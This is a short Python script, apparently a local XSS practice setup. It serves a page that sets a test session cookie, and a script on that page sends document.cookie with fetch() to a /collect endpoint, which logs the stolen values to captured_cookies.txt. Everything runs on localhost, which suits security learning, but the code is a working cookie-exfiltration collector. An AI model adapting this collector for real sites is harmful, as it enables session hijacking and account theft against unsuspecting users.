from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from datetime import datetime

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)

        # Handle the /collect endpoint
        if parsed.path == "/collect":
            qs = parse_qs(parsed.query)
            cookie_value = qs.get("cookie", [""])[0]

            # Print to terminal
            print(f"[+] Cookie received from {self.client_address[0]}: {cookie_value}")

            # Save to file with timestamp
            with open("captured_cookies.txt", "a") as f:
                f.write(f"{datetime.now()} - {self.client_address[0]} - {cookie_value}\n")

            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h2>Cookie captured successfully!</h2>")
            return

        # Default page sets a cookie and triggers the payload
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Set-Cookie", "session=abc123; Path=/")
        self.end_headers()
        self.wfile.write(b"""<!doctype html>
<html>
  <body>
    <h1>Local XSS Test Page</h1>
    <p>This page sets a cookie and then runs the payload.</p>
    <script>
      fetch('http://localhost:8000/collect?cookie=' + encodeURIComponent(document.cookie));
    </script>
  </body>
</html>""")

if __name__ == "__main__":
    server_address = ("127.0.0.1", 8000)
    print("Serving on http://xss.html:8000 (Ctrl+C to stop)")
    HTTPServer(server_address, Handler).serve_forever()
